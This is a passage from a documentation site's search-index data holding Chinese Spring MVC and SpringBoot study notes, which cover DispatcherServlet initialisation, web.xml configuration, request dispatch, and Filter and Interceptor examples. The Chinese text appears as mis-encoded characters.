çæModelFactoryï¼æ@ModelAttributeçkeyåvalueï¼ä»¥å@SessionAttributesçkeyåvalueæ·»å å° Modelä¸­ï¼å¯ä»¥ä¿éå¨controllerçModelä¸­å¾å°æ°æ®\n                5.4.4.3.3 åå»ºä¸ä¸ªå¤çæ¹æ³çå¯¹è±¡ï¼è®¾ç½®æ¹æ³è§£æå¨ï¼è§£æ@RequestParamç­æ³¨è§£æå¯¹è±¡ï¼ï¼è¿åå¼è§£æå¨ï¼æ¯å¦å äº@ResponseBodyè¦è§£ææJSONï¼ï¼è®¾ç½®binderFactory\n                5.4.4.3.4 åå»º ModelAndViewContainerï¼ç»ModelAndViewContainer æ·»å è§£æçåå®¹ï¼åå§åï¼ï¼ç¶åå·ä½å»æ§è¡ invokAndHandler(req,ModelAndViewContainer)ï¼å¾å°æ´å¤çä¿¡æ¯ç» ModelAndViewContainerï¼æ¯å¦è¿åç»æ\n                5.4.4.3.5 æåå¯¹ ModelAndViewContainer è¿è¡å¤çï¼å¤æ­å½åè¯·æ±æ¯å¦è¿è¡äºéå®å\n        5.4.5 éè¿è¿åç ModelAndView æ¥æ¾å¹¶è®¾ç½®è§å¾\n        5.4.6 æ§è¡æ¦æªå¨åç½®æ¹æ³\n        5.4.7 è§å¾æ¸²æ\n        5.4.8 åè°ç¨æ¦æªçæ§è¡å®ææ¹æ³\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n',normalizedContent:'# æ­å»º\n\n 1. éç½® pom.xml\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    \x3c!-- spring åé½æ --\x3e\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.7.10</version>\n        <relativepath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n\n\n    <groupid>com.fengqianrun</groupid>\n    <artifactid>study-springmvc</artifactid>\n    <version>0.0.1-snapshot</version>\n    \x3c!-- tomcat è®¤warå --\x3e\n    <packaging>war</packaging>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n        <project.build.sourceencoding>utf-8</project.build.sourceencoding>\n    </properties>\n\n    <dependencies>\n        \x3c!-- åªä½¿ç¨mvc --\x3e\n        <dependency>\n            <groupid>org.springframework</groupid>\n            <artifactid>spring-webmvc</artifactid>\n        </dependency>\n    </dependencies>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n 2. åå»º webapp/web-inf ç®å½ï¼å¹¶åå»º web.xml æä»¶\n\n<?xml version="1.0" encoding="utf-8"?>\n\x3c!-- è¿ä¸ªæä»¶æ¯tomcatè¦å»è¯»åçæä»¶ï¼æä»¶è·¯å¾å¿é¡»å¨ webapp/web-inf ä¸ï¼webappå javaæ¯åçº§ç®å½ --\x3e\n<web-app>\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            \x3c!-- æå®spring.xmlå°å --\x3e\n            <param-value>/web-inf/spring.xml</param-value>\n        </init-param>\n        \x3c!--æ°å­åªæ¯å³å®åå§åé¡ºåº\n            é»è®¤è´æ°ï¼å®¢æ·ç«¯ç¬¬ä¸æ¬¡è®¿é®æåå§å\n            å¤§äºé¶ï¼çæ°è¡¨ç¤ºæå¡å¨å¯å¨æ¶ï¼åå§å\n            æ°å­è¶å°è¶ååå§å\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- è®¿é®è·¯å¾åç¼ --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 3. åå»º /web-inf/spring.xml æä»¶\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">\n\n    <context:component-scan base-package="com.fengqianrun.mvc" />\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. éç½® tomcatï¼deployment ä¸­éç½® warï¼å¹¶ä¿®æ¹ application context\n 5. è®¿é® url\n\nè®¿é®å°åä¸º http://ip:port/tomcatéç½®çapplication context/web.xmléçservlet-name/controller/method\n\n\n1\n\n\n\n# dispatcherservlet åå§åè®²è§£\n\ndispatcherservlet ç»§æ¿èª httpservletbeanï¼å¶æç»ç¶ç±»è¿æ¯ servletï¼åªæ¯å®ç°äºè§èï¼éåäºä¸äºæ¹æ³ã æ¯å¦ httpservletbean è¯¥ç±»éåäº init () æ¹æ³ï¼å¨å¯å¨æå® dispatcherservlet çæ¶åï¼ä¼è°ç¨è¢«éåç init æ¹æ³ãæ´ä½ init æµç¨å¦ä¸ï¼\n\næ´ä¸ª dispatcherservlet å è½½æµç¨ï¼\n1. tomcatä¼è°ç¨servletçinit()æ¹æ³\n2. httpservletbeanéåäºinit()æ¹æ³\n    2.1 è¯»åweb.xmléé¢çåå®¹å¹¶å°è£\n    2.2 æ§è¡æ ¸å¿ initservletbean() æ¹æ³\n    2.3 initservletbean() æ¹æ³è°ç¨ initwebapplicationcontext()\n3. initwebapplicationcontext æ¹æ³ï¼ç¨äºåå»º context ä¸ä¸æ\n    3.1 è°ç¨findwebapplicationcontext()æ¥è¯¢ web.xml æ¯å¦èªå®ä¹äº contextattribute è¿ä¸ªå±æ§\n    3.2 æ²¡ç¨èªå®ä¹å createwebapplicationcontext(rootcontext) åå»º org.springframework.web.context.support.xmlwebapplicationcontext å®ä¾ï¼å¹¶è·ç¶å®¹å¨ç»å®ã\n    3.3 ç» context è®¾ç½®ç¯å¢ä¿¡æ¯ wac.setenvironment(getenvironment());\n    3.4 è®¾ç½®å®ä¹ contextconfiglocation(/web-inf/spring.xml) çè·¯å¾\n    3.5 è°ç¨ configureandrefreshwebapplicationcontext() æ¹æ³\n4. configureandrefreshwebapplicationcontext æ¹æ³ï¼éç½®contextä¸ä¸æï¼å¹¶åå§åbean\n    4.1 è®¾ç½®ä¸ä¸æ idï¼ä¸º`åºç¨åç§°`+`servlet-name`\n    4.2 æå·²æçä¸ä¸æ(cotent)ä»¥åéç½®(config)è®¾ç½®å°æ°çcontextä¸­\n    4.3 ç»æ°çcontextæ·»å ä¸ä¸ªapplicationlistenerï¼ä¸»è¦ä¸º contextrefreshlistenerï¼å½ä¸ä¸æå·æ°å®æ¯åéç¥ï¼è¯¥ç±»è¢«éç¥ä¼è°ç¨ **frameworkservlet.this.onapplicationevent(event);** æ¹æ³ï¼è¿ä¸ªæ¹æ³å¾éè¦\n    4.4 è°ç¨ refresh() æ¹æ³ï¼æ§è¡ bean çåå§åæä½ï¼springé£ä¸å¥ï¼ï¼æ§è¡å®è°ç¨ this.finishrefresh(); ä¹å°±éç¥å° 4.3 ä¸­ç contextrefreshlistenerå¯¹è±¡å¹¶è°ç¨ frameworkservlet.this.onapplicationevent(event);\n5. frameworkservlet.this.onapplicationevent(event);è°ç¨å°dispatcherservlet.initstrategies()æ¹æ³å¹¶ä¼æ§è¡ä»¥ä¸åç§æ¹æ³ï¼ \n    initmultipartresolver(context);\n    initlocaleresolver(context);\n    initthemeresolver(context);\n    inithandlermappings(context); \n    inithandleradapters(context);\n    inithandlerexceptionresolvers(context);\n    initrequesttoviewnametranslator(context);\n    initviewresolvers(context);\n    initflashmapmanager(context);\n6. inithandlermappingsï¼ç¨äºæå·²ç»å è½½å°springå®¹å¨çå¯¹è±¡è¿è¡ææ£ï¼æå®ç°äº @requestmapping | @controller çbeanæåºæ¥å¹¶å¾å°ææå®ç°äº@requestmappingæ³¨è§£çæ¹æ³ æ³¨åå° mappingregister å®¹å¨ä¸­\n    6.1 ä»å®¹å¨ä¸­è¯»åå°å®ç°äºhandlermapping.class çbeanï¼è¿éå°±æ¯æ¾æä»¬èªå®ä¹å®ç°äºhandlermapping.classçbean\n    6.2 å¦ææ²¡æèªå®ä¹ç handlermappingï¼ä¼å è½½é»è®¤ç handlermappingï¼é»è®¤æ beannameurlhandlermapping,requestmappinghandlermapping,routerfunctionmapping,ææ¾å°çæ³¨åå° beanå®¹å¨ä¸­\n        6.2.1 requestmappinghandlermapping å¨æ³¨åbeançæ¶åä¼æ§è¡ afterpropertiesset()æ¹æ³ï¼è¯¥æ¹æ³éé¢ä¼å¾å°ææbeanï¼å¹¶å¤æ­ç±»åæ¯å¦æ¯æ controller.class æ requestmapping.class æ³¨è§£ï¼å¦æç¬¦åæ¡ä»¶ä»£è¡¨ä½ æ¯ä¸ä¸ª controllerhandler\n        6.2.2 å¦ææ¯ä¸ä¸ª controllerhandlerï¼åè·åè¯¥ç±»ä¸­çæ¹æ³å¹¶å¾å°æåªå«ærequestmapping.classæ³¨è§£çæ¹æ³ï¼å¹¶ä¸è§£ææ³¨è§£ä¸çåæ°,ææ¹æ³æ³¨åå°ä¸ä¸ª mappingregistry é\n    6.3 beannameurlhandlermapping æ¯ç± applicationcontextaware æç¥è°ç¨åå§åæ¹æ³ç\n        6.3.1 beannameurlhandlermapping å requestmappinghandlermapping è§£æçæ¹å¼ä¸ä¸æ ·ï¼beannameurlhandlermappingå¾å°å®¹å¨ä¸­ææbeanï¼ä¼å¤æ­beannameçåç¼ä»¥ \'/\'å¼å¤´å¹¶æ¶éï¼å¹¶ä¸æ³¨åå° handlermapä¸­\n        6.3.2 beannameurlhandlermapping åå¶ä»controlleråæ³ä¸ä¸æ ·ï¼å·ä½è¦ç»ç±»å  @component("/test") å¹¶ä¸è¿æå®ç° implements controller\n        6.3.3 æ¾å°å¹éæ¡ä»¶çæ¹æ³æä»ç»´æ¤å°èªå·±ç handlermap ä¸­\n    6.4 æ³¨æ beannameurlhandlermapping å requestmappinghandlermappingç»´æ¤äºä¸åç handler å®¹å¨ï¼æä»¥ç¸åçè¯·æ±è·¯å¾ä¸ä¼æ¥éï¼å¦æç¸åï¼æ§è¡beannameurlhandlermappingçæ¹æ³ï¼å ä¸ºä¼åçº§æ¯requestmappinghandlermappingé å\n7. inithandleradaptersï¼åå§åæ¹æ³ä¼åææéè¦çåå¤å¥½å è½½è¿å»\n    7.1 inithandleradapters ä»springå®¹å¨ä¸­æ¾å äº @controlleradvice çbean\n    7.2 å¾å°beanåå¤æ­å äº @modelattribute çæ³¨è§£ä½ä¸åå«æ @requestmappingæ³¨è§£çæ¹æ³ å­å° modelattributeadvicecacheä¸­\n    7.3 å¾å°beanåå¤æ­å äº @initbinder çæ¹æ³ å­å° initbinderadvicecache ä¸­\n    7.4 ä»å®¹å¶ä¸­å¾å°ææå®ç° requestbodyadvice æ responsebodyadvice æ¥å£ï¼è®°å½ä¸æ¥\n    7.5 åå§å httprequesthandleradapterãsimplecontrollerhandleradapterãrequestmappinghandleradapterãhandlerfunctionadapter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# ç¶å­å®¹å¨\n\nç¶å­å®¹å¨ï¼å°±æ¯å¨ä¸ä¸ª web.xml éé¢æå®ä¸¤ä¸ª servletï¼å è½½ä¸åç spring.xmlï¼å±äº«ä¸ä¸ª listener ç¶å®¹å¨çå¯¹è±¡ãæ³¨æï¼ç¶å®¹å¨æ¯ä¼å¨ servlet èç¹ä¹åè§£æçãç¶å­å®¹å¨å·ä½å®ç°å¦ä¸ï¼\n\n<?xml version="1.0" encoding="utf-8"?>\n\x3c!-- è¿ä¸ªæä»¶æ¯tomcatè¦å»è¯»åçæä»¶ï¼æä»¶è·¯å¾å¿é¡»å¨ webapp/web-inf ä¸ï¼webappå javaæ¯åçº§ç®å½ --\x3e\n<web-app>\n    \n    \x3c!-- ç¶å®¹å¨ --\x3e\n    <listener>\n        <listener-class>org.springframework.web.context.contextloaderlistener</listener-class>\n    </listener>\n\n    <context-param>\n        <param-name>contextconfiglocation</param-name>\n        \x3c!-- æè¿°beançæä»¶ --\x3e\n        <param-value>/web-inf/spring2.xml</param-value>\n    </context-param>\n\n    \x3c!-- å­1 --\x3e\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            \x3c!-- æå®spring.xmlå°å --\x3e\n            <param-value>/web-inf/spring.xml</param-value>\n        </init-param>\n        \x3c!--æ°å­åªæ¯å³å®åå§åé¡ºåº\n            é»è®¤è´æ°ï¼å®¢æ·ç«¯ç¬¬ä¸æ¬¡è®¿é®æåå§å\n            å¤§äºé¶ï¼çæ°è¡¨ç¤ºæå¡å¨å¯å¨æ¶ï¼åå§å\n            æ°å­è¶å°è¶ååå§å\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- è®¿é®è·¯å¾åç¼ --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n\n    \x3c!-- å­2 --\x3e\n    <servlet>\n        <servlet-name>app1</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            \x3c!-- æå®spring.xmlå°å --\x3e\n            <param-value>/web-inf/spring1.xml</param-value>\n        </init-param>\n        \x3c!--æ°å­åªæ¯å³å®åå§åé¡ºåº\n            é»è®¤è´æ°ï¼å®¢æ·ç«¯ç¬¬ä¸æ¬¡è®¿é®æåå§å\n            å¤§äºé¶ï¼çæ°è¡¨ç¤ºæå¡å¨å¯å¨æ¶ï¼åå§å\n            æ°å­è¶å°è¶ååå§å\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app1</servlet-name>\n        \x3c!-- è®¿é®è·¯å¾åç¼ --\x3e\n        <url-pattern>/app1/*</url-pattern>\n    </servlet-mapping>\n\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\ncontextloaderlistener ä¼åå»ºä¸ä¸ªå®¹å¨ applicationcontextï¼è§£æéç½®ç xml æä»¶ï¼èµ° spring å¸¸è§ç bean å è½½æµç¨ã è¿ä¸ª applicationcontext ä¼è¢«åä¸º servlet çç¶å®¹å¨è¢«å è½½å° servletcontextï¼mapï¼ä¸­ï¼å½ servlet è¢«å è½½çæ¶åä¼åç¶å®¹å¨è¿è¡ç»å®ï¼è¯¦è§ dispatcherservlet åå§åè®²è§£ 3.2\n\n\n# ä»£ç åä»£ xml éç½®\n\næ´ä½å xml æ¯å·®ä¸å¤ç\n\npublic class mywebapplicationinitializer implements webapplicationinitializer {\n    \n    @override\n    public void onstartup(servletcontext servletcontext) throws servletexception {\n        // load spring web application configuration\n        annotationconfigwebapplicationcontext context = new annotationconfigwebapplicationcontext();\n        context.register(appconfig.class);\n\n        // create and register the dispatcherservlet\n        dispatcherservlet servlet = new dispatcherservlet(context);\n        servletregistration.dynamic registration = servletcontext.addservlet("app", servlet);\n        registration.setloadonstartup(1);\n        registration.addmapping("/app/*");\n    }\n\n    @componentscan("com.fengqianrun.mvc")\n    public class appconfig{\n\n    }\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nmywebapplicationinitializer è¢«å è½½æ¯éè¿ springservletcontainerinitializer å®ç°äº servletcontainerinitializer çè§èï¼å¨ springservletcontainerinitializer ä¸­æä¸ä¸ª @handlestypesï¼éé¢å°±å®ä¹äº webapplicationinitializerï¼ä¼æè¯¥ç±»å è½½ä¼ å¥ springservletcontainerinitializer ç onstartup æ¹æ³ï¼è¯¥æ¹æ³éé¢ç»§ç»­è°ç¨å®ç°äº webapplicationinitializer ç onstartup æ¹æ³\n\n\n# è¯·æ±å®ç°\n\næä»¬é½ç¥éæ©åºåä¸ä¸ª httpservlet å¹¶å®ç° service () è½¬åå·ä½ doget dopost å¹¶å®ç°ä¸å¡é»è¾ãdispatcherservlet ä¸æ ·å®ç°äº httpservlet å¹¶éåäº serviceãdogetãdopost ç­æ¹æ³ï¼å®ç°å·ä½æµç¨æ¯ï¼\n\n1. ç±dispatcherservletçç¶ç±»frameworkservletå·ä½å®ç°äºserviceãdogetãdopostæ¹æ³\n2. frameworkservletä¼åè¢«è°ç¨service()æ¹æ³ï¼è§£ææ¹æ³çè¯·æ±æ¹å¼æ¯ get è¿æ¯ postï¼åè°ç¨httpservletçservice()æ¹æ³è¿ä¸æ­¥å¤æ­æ¯è°ç¨ doget è¿æ¯ dopostæ¹æ³\n3. httpservletå¨è°ç¨frameworkservletå·ä½å®ç°äºdogetædopostæ¹æ³\n    3.1 \n4. dopostå®ç°ä¼è°ç¨frameworkservletçå­ç±»dispatcherservletçdoserviceæ¹æ³\n    4.1 doservice é¦åä¼æå°è¯·æ±çä¿¡æ¯\n    4.2 æcontextæ·»å å° request çè¯·æ±ä¸­\n    4.3 flashmapmanager\n    4.4 è°ç¨ dodispatch æ¹æ³\n5. dodispatch\n    5.1 å¾å°é»è®¤çä¸ä¸ª mappingï¼ beannameurlhandlermapping,requestmappinghandlermapping,routerfunctionmappingï¼è¯¦ç»å¨dispatcherservlet åå§åè®²è§£6.2ä¸­ï¼\n    5.2 ä¾¿å©æ¯ä¸ª mappingï¼å¹¶å¾å°è¯·æ±çè·¯å¾ï¼æ ¹æ®è·¯å¾å»æ¾ handlerï¼è¿ä¸ªhandlerå°±æ¯dispatcherservlet åå§åè®²è§£6.2.2çæ¹æ³ï¼ï¼å¦ææ¯beannameurlhandlermappingæ¾å°çæ¯beanï¼requestmappinghandlermappingæ¾å°çæ¯ hanlermethod ç»ä¸ä¸º handler\n    5.3 æ¾å°handleråä¼å°è£ä¸ºä¸ä¸ª handleræ§è¡é¾ï¼è¿ä¸ªæ§è¡é¾åå«äºæ¦æªå¨ï¼æä»¥ç§°ä¸ºé¾\n    5.4 ç±äºè·åç handler æ¯ä¸ä¸ªobjectï¼æ æ³ç¡®å®æ¯beannameurlhandlermappingçbeanè¿æ¯requestmappinghandlermappingçhandlermethodï¼æä»¥æ§è¡ gethandleradapter è¿è¡éé\n        5.4.1 æå·²ç»å è½½ç handleradapters è¿è¡ä¾¿å©ï¼dispatcherservlet åå§åè®²è§£ 7.5ï¼\n        5.4.2 æ¯ä¸ª handleradapter å®ç°æ¹å¼ä¸ä¸æ ·ï¼ä¼æä¸ªç»ä¸ç supports æ¹æ³æ¥å¤æ­æ¯å¦å®ç°äºä¸å mapping çè¦æ±ï¼å¹¶æ¾å°åéç adapter\n            5.4.2.1 å¦ requestmappinghandlermapping å¯¹åºçæ¯ requestmappinghandleradapterï¼adapter ç supportsä¼å¤æ­æ¯å¦æ¯ handlermethod çå®ä¾ï¼æ¯åå¾å°è¿ä¸ª adapter\n        5.4.3 handleræ§è¡é¾å¼å§æ§è¡æ¦æªå¨ï¼ä¼éåææçæ¦æªå¨æ§è¡æ§è¡åç½®æ¹æ³ï¼å¦ææ¦æªå¨åç½®æ¹æ³è¿åfalseååé¢ä¸å¨æ§è¡\n        5.4.4 æ¦æªå¨æ§è¡å®æ¯åå°±å¯ä»¥æ§è¡å¾å°ç handleradapter ç handler æ¹æ³ï¼å»çæ­£æ§è¡ controller çæ¹æ³ï¼è¿åå¼ä¼å°è£æ modelandview\n            5.4.4.1 æ£æ¥æ¯å¦éå¶äºè¯·æ±æ¹å¼ï¼æ¯å¦åªæ¯æ post è¯·æ±\n            5.4.4.2 å¤æ­æ¯å¦å¼å¯sessionéï¼ç¨äºå¯¹ææç¸åsessionçè¯·æ±è¿è¡å¹¶åéå¶\n            5.4.4.3 æ§è¡invokehandlermethodæ¹æ³\n                5.4.4.3.1 æ¾åº@initbinderåå»ºä¸ä¸ª binderfactory å·¥åï¼è¯¥å·¥åæ¯å¯¹methodè¯·æ±åæ°åç±»åè½¬æ¢ï¼æ¾çæ¯å½åmethodæå¨å±ç@initbinderçè½¬æ¢å¨\n                5.4.4.3.2 çæmodelfactoryï¼æ@modelattributeçkeyåvalueï¼ä»¥å@sessionattributesçkeyåvalueæ·»å å° modelä¸­ï¼å¯ä»¥ä¿éå¨controllerçmodelä¸­å¾å°æ°æ®\n                5.4.4.3.3 åå»ºä¸ä¸ªå¤çæ¹æ³çå¯¹è±¡ï¼è®¾ç½®æ¹æ³è§£æå¨ï¼è§£æ@requestparamç­æ³¨è§£æå¯¹è±¡ï¼ï¼è¿åå¼è§£æå¨ï¼æ¯å¦å äº@responsebodyè¦è§£ææjsonï¼ï¼è®¾ç½®binderfactory\n                5.4.4.3.4 åå»º modelandviewcontainerï¼ç»modelandviewcontainer æ·»å è§£æçåå®¹ï¼åå§åï¼ï¼ç¶åå·ä½å»æ§è¡ invokandhandler(req,modelandviewcontainer)ï¼å¾å°æ´å¤çä¿¡æ¯ç» modelandviewcontainerï¼æ¯å¦è¿åç»æ\n                5.4.4.3.5 æåå¯¹ modelandviewcontainer è¿è¡å¤çï¼å¤æ­å½åè¯·æ±æ¯å¦è¿è¡äºéå®å\n        5.4.5 éè¿è¿åç modelandview æ¥æ¾å¹¶è®¾ç½®è§å¾\n        5.4.6 æ§è¡æ¦æªå¨åç½®æ¹æ³\n        5.4.7 è§å¾æ¸²æ\n        5.4.8 åè°ç¨æ¦æªçæ§è¡å®ææ¹æ³\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n',charsets:{cjk:!0}},{title:"SpringBoot ä¹ FilterãInterceptorãAspect",frontmatter:{title:"SpringBoot ä¹ FilterãInterceptorãAspect",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/200/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/200.SpringBoot%20%E4%B9%8B%20Filter%E3%80%81Interceptor%E3%80%81Aspect.html",relativePath:"01.æ¡æ¶/01.Spring/03.spring boot/200.SpringBoot ä¹ FilterãInterceptorãAspect.md",key:"v-3002ba14",path:"/spring/spring-boot/200/",headers:[{level:2,title:"Filter è¿æ»¤å¨",slug:"filter-è¿æ»¤å¨",normalizedTitle:"filter è¿æ»¤å¨",charIndex:140},{level:3,title:"ç¬¬ä¸ç§",slug:"ç¬¬ä¸ç§",normalizedTitle:"ç¬¬ä¸ç§",charIndex:192},{level:3,title:"ç¬¬äºç§",slug:"ç¬¬äºç§",normalizedTitle:"ç¬¬äºç§",charIndex:971},{level:2,title:"Interceptor æ¦æªå¨",slug:"interceptor-æ¦æªå¨",normalizedTitle:"interceptor æ¦æªå¨",charIndex:1678},{level:3,title:"ä¸ãå®ç°HandlerInterceptoræ¥å£",slug:"ä¸ãå®ç°handlerinterceptoræ¥å£",normalizedTitle:"ä¸ãå®ç° handlerinterceptor æ¥å£",charIndex:1798},{level:3,title:"äºãæ³¨åå°InterceptorRegistration",slug:"äºãæ³¨åå°interceptorregistration",normalizedTitle:"äºãæ³¨åå° interceptorregistration",charIndex:3314},{level:2,title:"Aspect åé¢",slug:"aspect-åé¢",normalizedTitle:"aspect åé¢",charIndex:4229}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Filter è¿æ»¤å¨ ç¬¬ä¸ç§ ç¬¬äºç§ Interceptor æ¦æªå¨ ä¸ãå®ç°HandlerInterceptoræ¥å£ äºãæ³¨åå°InterceptorRegistration Aspect åé¢",content:'springboot æä¾äºéä¸­æ¦æªæºå¶ï¼å¯ä»¥æ¹ä¾¿æä»¬å¨ä¸å¡å±è¿è¡æ©å±ï¼çæçæ filterãinterceptorãAspectãå ControllerAdvice ä»ç¨äºå¤ç controller å¼å¸¸äºæ¯è¾å¤çï¼æä»¥åæ¬¡ä¸è¿å¤ä»ç»ãä¸å¾ä»ç»äºæºå¶æå¨å±æ¬¡ï¼\n\n\n\n\n# Filter è¿æ»¤å¨\n\nå®ç°æ¹å¼æä¸¤ç§ï¼è¿æ»¤å¨æ æ³è·å¾ä¸ä¸æãå¼æ éçå¯¹è±¡ï¼å¹¶å¯¹ææè¯·æ±èµ·ä½ç¨\n\n\n# ç¬¬ä¸ç§\n\nå®ç° Filter æ¥å£\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\nimport javax.servlet.*;\nimport java.io.IOException;\n\n@Component\n@Slf4j\npublic class MyFilter implements Filter {\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        log.info("åå§å");\n    }\n\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        log.info("æ§è¡");\n        filterChain.doFilter(servletRequest,servletResponse);\n    }\n\n    @Override\n    public void destroy() {\n        log.info("éæ¯");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# ç¬¬äºç§\n\néç½®å° Bean\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.MyFilter;\nimport org.springframework.boot.web.servlet.FilterRegistrationBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport java.util.Arrays;\n\n@Configuration\npublic class FilterConfig {\n\n    @Bean\n    public FilterRegistrationBean myFilter(){\n        FilterRegistrationBean filterRegistrationBean = new FilterRegistrationBean();\n        filterRegistrationBean.setFilter(new MyFilter());\n        filterRegistrationBean.setUrlPatterns(Arrays.asList("/*"));\n        return filterRegistrationBean;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# Interceptor æ¦æªå¨\n\næ¦æªå¨å¯ä»¥è·å IOC å®¹å¨ä¸­çåä¸ª bean, æ¦æªå¨æ¯åºäº java çåå°æºå¶çï¼æ¦æªå¨åªè½å¯¹ action è¯·æ±èµ·ä½ç¨ï¼æ¦æªå¨å¯ä»¥è®¿é® action ä¸ä¸æãå¼æ éçå¯¹è±¡ï¼ä½æ æ³è·ååæ°ã\n\n\n# ä¸ãå®ç° HandlerInterceptor æ¥å£\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.servlet.HandlerInterceptor;\nimport org.springframework.web.servlet.ModelAndView;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@Slf4j\n@Component\npublic class MyInterceptor implements HandlerInterceptor{\n\n    /**\n     * åè½æè¿°: æ§è¡æ¹æ³å\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        log.info("æ§è¡æ¹æ³å");\n        return false;\n    }\n\n    /**\n     * åè½æè¿°: æ§è¡æ¹æ³åï¼æå¼å¸¸ä¸æ§è¡\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @Override\n    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {\n        log.info("æ§è¡æ¹æ³åï¼æå¼å¸¸ä¸æ§è¡");\n    }\n\n    /**\n     * åè½æè¿°: æ§è¡å®ä¸å®ä¼æ§è¡\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @Override\n    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {\n        log.info("æ§è¡å®ä¸å®ä¼æ§è¡");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# äºãæ³¨åå° InterceptorRegistration\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.MyInterceptor;\nimport 